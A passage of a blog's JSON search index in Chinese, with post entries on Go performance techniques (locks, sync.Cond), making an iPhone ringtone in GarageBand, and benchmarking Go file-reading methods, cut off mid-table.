GC 的压力，提升系统的性能。\n一句话总结：用来保存和复用临时对象，减少内存分配，降低 GC 压力。\n并发编程 关于锁\n无锁化 并非所有的并发都需要加锁。适当地降低锁的粒度，甚至采用无锁化的设计，更能提升并发能力。 无锁数据结构 利用硬件支持的原子操作可以实现无锁的数据结构，原子操作可以在 lock-free 的情况下保证并发安全，并且它的性能也能做到随 CPU 个数的增多而线性扩展。很多语言都提供 CAS 原子操作（如 Go 中的 atomic 包和 C++11 中的 atomic 库），可以用于实现无锁数据结构，如无锁链表。 串行无锁 串行无锁是一种思想，就是避免对共享资源的并发访问，改为每个并发操作访问自己独占的资源，达到串行访问资源的效果，来避免使用锁。不同的场景有不同的实现方式。比如网络 I/O 场景下将单 Reactor 多线程模型改为主从 Reactor 多线程模型，避免对同一个消息队列锁读取。 减少锁竞争 如果加锁无法避免，则可以采用分片的形式，减少对资源加锁的次数，这样也可以提高整体的性能。 比如 Golang 优秀的本地缓存组件 bigcache、go-cache、freecache 都实现了分片功能，每个分片一把锁，采用分片存储的方式减少加锁的次数从而提高整体性能。 优先使用共享锁而非互斥锁 所谓互斥锁，指锁只能被一个 Goroutine 获得。共享锁指可以同时被多个 Goroutine 获得的锁。 Go 标准库 sync 提供了两种锁，互斥锁（sync.Mutex）和读写锁（sync.RWMutex），读写锁便是共享锁的一种具体实现。 限制协程数量\n每个协程至少需要消耗 2KB 的空间，那么假设计算机的内存是 4GB，那么至多允许 4GB/2KB = 1M 个协程同时存在。\n协程池化 Jeffail/tunny / panjf2000/ants 使用 sync.Once 避免重复执行\n使用 sync.Cond 通知协程\nsync.Cond 是基于互斥锁/读写锁实现的条件变量，用来协调想要访问共享资源的那些 Goroutine，当共享资源的状态发生变化的时候，sync.Cond 可以用来通知等待条件发生而阻塞的 Goroutine。\n我们实现一个简单的例子，三个协程调用 Wait() 等待，另一个协程调用 Broadcast() 唤醒所有等待的协程。\ndone 即多个 Goroutine 阻塞等待的条件。 read() 调用 Wait() 等待通知，直到 done 为 true。 write() 接收数据，接收完成后，将 done 置为 true，调用 Broadcast() 通知所有等待的协程。 write() 中的暂停了 1s，一方面是模拟耗时，另一方面是确保前面的 3 个 read 协程都执行到 Wait()，处于等待状态。main 函数最后暂停了 3s，确保所有操作执行完毕。 var done = false func read(name string, c *sync.Cond) { c.L.Lock() for !done { c.Wait() } log.Println(name, \u0026#34;starts reading\u0026#34;) c.L.Unlock() } func write(name string, c *sync.Cond) { log.Println(name, \u0026#34;starts writing\u0026#34;) time.Sleep(time.Second) done = true log.Println(name, \u0026#34;wakes all\u0026#34;) c.Broadcast() } func main() { cond := sync.NewCond(\u0026amp;sync.Mutex{}) go read(\u0026#34;reader1\u0026#34;, cond) go read(\u0026#34;reader2\u0026#34;, cond) go read(\u0026#34;reader3\u0026#34;, cond) write(\u0026#34;writer\u0026#34;, cond) time.Sleep(time.Second * 3) } $ go run main.go 2022/03/07 17:20:09 writer starts writing 2022/03/07 17:20:10 writer wakes all 2022/03/07 17:20:10 reader3 starts reading 2022/03/07 17:20:10 reader1 starts reading 2022/03/07 17:20:10 reader2 starts reading sync.Cond 不能被复制 sync.Cond 不能被复制的原因，并不是因为其内部嵌套了 Locker。因为 NewCond 时传入的 Mutex/RWMutex 指针，对于 Mutex 指针复制是没有问题的。 主要原因是 sync.Cond 内部是维护着一个 Goroutine 通知队列 notifyList。如果这个队列被复制的话，那么就在并发场景下导致不同 Goroutine 之间操作的 notifyList.wait、notifyList.notify 并不是同一个，这会导致出现有些 Goroutine 会一直阻塞。 从等待队列中按照顺序唤醒，先进入等待队列，先被唤醒。 调用 Wait() 前要加锁 调用 Wait() 函数前，需要先获得条件变量的成员锁，原因是需要互斥地变更条件变量的等待队列。在 Wait() 返回前，会重新上锁。 ","date":"April 22, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220422-go-high-performance-programming-manual/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/iSxWFsnNLGgilzKIsSDBgg\" target=\"_blank\" rel=\"noopener\"\u003eGo 语言高性能编程手册（万字长文）\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"常用数据结构\"\u003e常用数据结构\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e反射虽好，切莫贪杯\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e优先使用 \u003ccode\u003estrconv\u003c/code\u003e 而不是 \u003ccode\u003efmt\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e少量的重复不比反射差\u003c/li\u003e\n\u003cli\u003e慎用 \u003ccode\u003ebinary.Read\u003c/code\u003e 和 \u003ccode\u003ebinary.Write\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ebinary.Read\u003c/code\u003e 和 \u003ccode\u003ebinary.Write\u003c/code\u003e 使用反射并且很慢。如果有需要用到这两个函数的地方，我们应该手动实现这两个函数的相关功能，而不是直接去使用它们。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e避免重复的字符串到字节切片的转换\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e指定容器(slice/map)容量\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e字符串拼接方式\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e行内拼接字符串推荐使用运算符 \u003ccode\u003e+\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e非行内拼接字符串推荐使用 \u003ccode\u003estrings.Builder\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e遍历 \u003ccode\u003e[]struct{}\u003c/code\u003e 使用下标而不是 \u003ccode\u003erange\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e两种通过 index 遍历 \u003ccode\u003e[]struct\u003c/code\u003e 性能没有差别，但是 \u003ccode\u003erange\u003c/code\u003e 遍历 \u003ccode\u003e[]struct\u003c/code\u003e 中元素时，性能非常差。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003erange\u003c/code\u003e 遍历 \u003ccode\u003e[]*struct\u003c/code\u003e 中元素时，與下标性能没有差别。\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"内存管理\"\u003e内存管理\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e使用空结构体节省内存\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003estruct 布局要考虑内存对齐\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCPU 访问内存时，并不是逐个字节访问，而是以字长（word size）为单位访问。比如 32 位的 CPU ，字长为 4 字节，那么 CPU 访问内存的单位也是 4 字节。\n这么设计的目的，是减少 CPU 访问内存的次数，加大 CPU 访问内存的吞吐量。比如同样读取 8 个字节的数据，一次读取 4 个字节那么只需要读取 2 次。\u003c/p\u003e","tags":["URL","Go"],"title":"Go语言高性能编程手册（万字长文）"},{"categories":["URL","iPhone","ringtone"],"contents":" iPhone 鈴聲製作教學，將 MP3 音樂換成電話鈴聲或鬧鐘鈴聲 影片版的 iPhone 鈴聲製作步驟 步驟一：準備想換成 iPhone 鈴聲的 MP3 音樂 首先第一步是準備好你想當成鈴聲的音樂，建議是 MP3 檔，然後儲存在「檔案 App」的資料夾內\n步驟二：透過 Garageband App 製作 iPhone 鈴聲 接著，請開啟 iPhone 內建的「Garageband App」（如果你刪除了請先下載回來），點選「製作歌曲」，然後選擇「錄音機」。\n點選音軌: 現在進入了錄音機的頁面，點選左上角第三個圖示進到音軌，然後再點選右上角倒數第二個圓圈圖示 將 MP3 音樂拖曳到音軌上: 這步驟很關鍵，將分頁切換到「檔案」，然後找到你剛剛下載好的 MP3 音樂，將它拖曳到左邊的音軌上。 編輯鈴聲: 接著，你可以拖拉音樂的前後來編輯你想要的鈴聲片段，也可以按播放鍵來試聽目前的鈴聲是否符合你的預期。 儲存歌曲: 確認沒問題之後，點選左上角的「三角形圖示」，然後按一下「我的歌曲」，你會看到該檔案已儲存成功，接著請長按它。 製作鈴聲: 長按該音訊檔案後，選擇「分享」，然後點選「鈴聲」。 輸出鈴聲: 而在這邊你可以編輯該鈴聲的名稱，編輯完後點選右上角的「輸出」，這樣就完成自訂 iPhone 鈴聲了！ 步驟三：iPhone 電話鈴聲設定 開啟 iPhone 上的「設定」app，點選「聲音與觸覺回饋」\u0026gt;「鈴聲」，在鈴聲這區塊內你就會看到剛剛製作好的鈴聲囉。\n步驟四：iPhone 鬧鐘鈴聲設定 開啟「時鐘 App」點選左上角的「編輯」，然後選擇任一個你想更換鈴聲的的 iPhone 鬧鐘。 點選「提示聲」後，將「鈴聲」改為你剛剛製作好的 MP3 音樂鈴聲就可以了。\n","date":"April 10, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220410-iphone-ringtone-mp3/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.tech-girlz.com/2020/08/iphone-ringtone-mp3.html/amp\" target=\"_blank\" rel=\"noopener\"\u003eiPhone 鈴聲製作教學，將 MP3 音樂換成電話鈴聲或鬧鐘鈴聲\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://youtu.be/zA376ii82U0\" target=\"_blank\" rel=\"noopener\"\u003e影片版的 iPhone 鈴聲製作步驟\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"步驟一準備想換成-iphone-鈴聲的-mp3-音樂\"\u003e步驟一：準備想換成 iPhone 鈴聲的 MP3 音樂\u003c/h5\u003e\n\u003cp\u003e首先第一步是準備好你想當成鈴聲的音樂，建議是 MP3 檔，然後儲存在「檔案 App」的資料夾內\u003c/p\u003e\n\u003ch5 id=\"步驟二透過-garageband-app-製作-iphone-鈴聲\"\u003e步驟二：透過 Garageband App 製作 iPhone 鈴聲\u003c/h5\u003e\n\u003cp\u003e接著，請開啟 iPhone 內建的「Garageband App」（如果你刪除了請先下載回來），點選「製作歌曲」，然後選擇「錄音機」。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e點選音軌: 現在進入了錄音機的頁面，點選左上角第三個圖示進到音軌，然後再點選右上角倒數第二個圓圈圖示\u003c/li\u003e\n\u003cli\u003e將 MP3 音樂拖曳到音軌上: 這步驟很關鍵，將分頁切換到「檔案」，然後找到你剛剛下載好的 MP3 音樂，將它拖曳到左邊的音軌上。\u003c/li\u003e\n\u003cli\u003e編輯鈴聲: 接著，你可以拖拉音樂的前後來編輯你想要的鈴聲片段，也可以按播放鍵來試聽目前的鈴聲是否符合你的預期。\u003c/li\u003e\n\u003cli\u003e儲存歌曲: 確認沒問題之後，點選左上角的「三角形圖示」，然後按一下「我的歌曲」，你會看到該檔案已儲存成功，接著請長按它。\u003c/li\u003e\n\u003cli\u003e製作鈴聲: 長按該音訊檔案後，選擇「分享」，然後點選「鈴聲」。\u003c/li\u003e\n\u003cli\u003e輸出鈴聲: 而在這邊你可以編輯該鈴聲的名稱，編輯完後點選右上角的「輸出」，這樣就完成自訂 iPhone 鈴聲了！\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 id=\"步驟三iphone-電話鈴聲設定\"\u003e步驟三：iPhone 電話鈴聲設定\u003c/h5\u003e\n\u003cp\u003e開啟 iPhone 上的「設定」app，點選「聲音與觸覺回饋」\u0026gt;「鈴聲」，在鈴聲這區塊內你就會看到剛剛製作好的鈴聲囉。\u003c/p\u003e\n\u003ch5 id=\"步驟四iphone-鬧鐘鈴聲設定\"\u003e步驟四：iPhone 鬧鐘鈴聲設定\u003c/h5\u003e\n\u003cp\u003e開啟「時鐘 App」點選左上角的「編輯」，然後選擇任一個你想更換鈴聲的的 iPhone 鬧鐘。\n點選「提示聲」後，將「鈴聲」改為你剛剛製作好的 MP3 音樂鈴聲就可以了。\u003c/p\u003e","tags":["URL","iPhone","ringtone"],"title":"iPhone 鈴聲製作教學，將 MP3 音樂換成電話鈴聲或鬧鐘鈴聲"},{"categories":["URL","Go"],"contents":" 怎么选择 Go 文件读取方案 Go 提供了可一次性读取文件内容的方法：os.ReadFile 与 ioutil.ReadFile。在 Go 1.16 开始，ioutil.ReadFile 就等价于 os.ReadFile。\n一次性加载文件的优缺点非常明显，它能减少 IO 次数，但它会将文件内容都加载至内存中，对于大文件，存在内存撑爆的风险。\n逐行读取 Go 中 bufio.Reader 对象提供了一个 ReadLine() 方法，但其实我们更多地是使用 ReadBytes(\u0026rsquo;\\n\u0026rsquo;) 或者 ReadString(\u0026rsquo;\\n\u0026rsquo;) 代替。\nfunc ReadLines(filename string) { fi, err := os.Open(filename) if err != nil{ panic(err) } defer fi.Close() reader := bufio.NewReader(fi) for { _, err = reader.ReadString(\u0026#39;\\n\u0026#39;) if err != nil { if err == io.EOF { break } panic(err) } } } 块读取 块读取也称为分片读取，这也很好理解，我们可以将内容分成一块块的，每次读取指定大小的块内容。这里，我们将块大小设置为 4KB。\nfunc ReadChunk(filename string) { f, err := os.Open(filename) if err != nil { panic(err) } defer f.Close() buf := make([]byte, 4*1024) r := bufio.NewReader(f) for { _, err = r.Read(buf) if err != nil { if err == io.EOF { break } panic(err) } } } result BenchmarkOsReadFile4KB-8 92877 12491 ns/op BenchmarkOsReadFile4MB-8 1620 744460 ns/op BenchmarkOsReadFile4GB-8 1 7518057733 ns/op signal: killed BenchmarkReadLines4KB-8 90846 13184 ns/op BenchmarkReadLines4MB-8 493 2338170 ns/op BenchmarkReadLines4GB-8 1 3072629047 ns/op BenchmarkReadLines16GB-8 1 12472749187 ns/op BenchmarkReadChunk4KB-8 99848 12262 ns/op BenchmarkReadChunk4MB-8 913 1233216 ns/op BenchmarkReadChunk4GB-8 1 2095515009 ns/op BenchmarkReadChunk16GB-8 1 8547054349 ns/op 在本文的测试条件下（每行数据 1KB），对于小对象 4KB 的读取，三种方式差距并不大；在 MB 级别的读取中，直接加载最快，但块读取也慢不了多少；上了 GB 后，块读取方式会最快。\n且有一点可以注意到的是，在整个文件加载的方式中，对于 16 GB 的文件数据（测试机器运行内存为 8GB），会内存耗尽出错，没法执行。\n","date":"March 29, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220329-go-read-file/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/Z-19Yj8Je7Wb9bqvMR35Cg\" target=\"_blank\" rel=\"noopener\"\u003e怎么选择 Go 文件读取方案\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eGo 提供了可一次性读取文件内容的方法：\u003ccode\u003eos.ReadFile\u003c/code\u003e 与 \u003ccode\u003eioutil.ReadFile\u003c/code\u003e。在 Go 1.16 开始，\u003ccode\u003eioutil.ReadFile\u003c/code\u003e 就等价于 \u003ccode\u003eos.ReadFile\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e一次性加载文件的优缺点非常明显，它能减少 IO 次数，但它会将文件内容都加载至内存中，对于大文件，存在内存撑爆的风险。\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"逐行读取\"\u003e逐行读取\u003c/h4\u003e\n\u003cp\u003eGo 中 bufio.Reader 对象提供了一个 ReadLine() 方法，但其实我们更多地是使用 ReadBytes(\u0026rsquo;\\n\u0026rsquo;) 或者 ReadString(\u0026rsquo;\\n\u0026rsquo;) 代替。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eReadLines\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003efilename\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#a6e22e\"\u003efi\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOpen\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003efilename\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  panic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efi\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eClose\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#a6e22e\"\u003ereader\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebufio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewReader\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003efi\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ereader\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEOF\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   panic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"块读取\"\u003e块读取\u003c/h4\u003e\n\u003cp\u003e块读取也称为分片读取，这也很好理解，我们可以将内容分成一块块的，每次读取指定大小的块内容。这里，我们将块大小设置为 4KB。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eReadChunk\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003efilename\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOpen\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003efilename\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  panic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eClose\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebufio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewReader\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRead\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEOF\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   panic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"result\"\u003eresult\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkOsReadFile4KB-8           \u003cspan style=\"color:#ae81ff\"\u003e92877\u003c/span\u003e             \u003cspan style=\"color:#ae81ff\"\u003e12491\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkOsReadFile4MB-8            \u003cspan style=\"color:#ae81ff\"\u003e1620\u003c/span\u003e            \u003cspan style=\"color:#ae81ff\"\u003e744460\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkOsReadFile4GB-8               \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e        \u003cspan style=\"color:#ae81ff\"\u003e7518057733\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esignal: killed\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkReadLines4KB-8            \u003cspan style=\"color:#ae81ff\"\u003e90846\u003c/span\u003e             \u003cspan style=\"color:#ae81ff\"\u003e13184\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkReadLines4MB-8              \u003cspan style=\"color:#ae81ff\"\u003e493\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e2338170\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkReadLines4GB-8                \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e        \u003cspan style=\"color:#ae81ff\"\u003e3072629047\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkReadLines16GB-8               \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e        \u003cspan style=\"color:#ae81ff\"\u003e12472749187\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkReadChunk4KB-8            \u003cspan style=\"color:#ae81ff\"\u003e99848\u003c/span\u003e             \u003cspan style=\"color:#ae81ff\"\u003e12262\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkReadChunk4MB-8              \u003cspan style=\"color:#ae81ff\"\u003e913\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e1233216\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan 